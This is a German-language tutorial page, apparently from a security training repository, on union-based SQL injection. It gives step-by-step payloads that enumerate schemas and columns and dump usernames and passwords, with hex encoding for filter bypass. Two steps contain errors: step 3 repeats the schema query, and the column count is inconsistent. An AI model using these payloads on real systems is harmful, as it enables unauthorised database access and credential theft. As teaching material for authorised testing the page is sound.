# Union-Based SQL Injection Attack

> Dieses Dokument beschreibt die Durchführung einer Union-Based. SQL-Injection zur Extraktion von Daten aus einer Datenbank.

## Inhaltsverzeichnis
- [Ziel](#ziel)
- [Beispielhafte Schritte zur Datenextraktion mit `GROUP_CONCAT`](#beispielhafte-schritte-zur-datenextraktion-mit-group_concat)
- [Hinweise](#hinweise)
- [Sicherheitshinweis](#sicherheitshinweis)
- [Haftungsausschluss](#haftungsausschluss)



## Ziel

Datenbankinformationen schrittweise über die `UNION SELECT`-Technik auslesen – insbesondere bei anfälligen Parametern wie z. B. `id`, `search`, `user`, etc.



## Beispielhafte Schritte zur Datenextraktion mit `GROUP_CONCAT`

1. **Test auf Verwundbarkeit mit UNION SELECT**
```sql
test' UNION SELECT 1,2,3 FROM table_name --
```

2. **Schemas (Datenbanken) anzeigen:**
```sql
test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
```

3. **Tabellennamen der aktuellen Datenbank anzeigen:**
```sql
test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
```

4. **Spaltennamen aus einer bestimmten Tabelle anzeigen (Klartextname):**
```sql
test' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --
```

5. **Spaltennamen anzeigen mit Hex-Wert für Tabellenname (Bypass & Genauigkeit):**
```sql
test' UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_name=0x7573657273 --
```

💡 `users` in Hex: 0x7573657273
Tool für Umwandlung: [Codebeautify – String to Hex](https://codebeautify.org/string-hex-converter)

6. **Nutzerdaten ausgeben (z. B. Username & Passwort):**
```sql
test' UNION SELECT 1,group_concat(username,0x3a3a,password),3 FROM users --
```



## Hinweise
- `group_concat()` ist hilfreich zum Kombinieren mehrerer Ergebnisse in einer Zeile.

- Hexadezimaldarstellung (0x...) kann helfen, Filter oder Escaping-Probleme zu umgehen.

- Kommentare wie -- oder --+ beenden den ursprünglichen SQL-Befehl korrekt.



## Sicherheitshinweis

Dieses Wissen dient ausschließlich der legalen Anwendung im Rahmen von Penetration Tests mit ausdrücklicher Erlaubnis. Der Missbrauch kann strafrechtlich verfolgt werden.



## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---
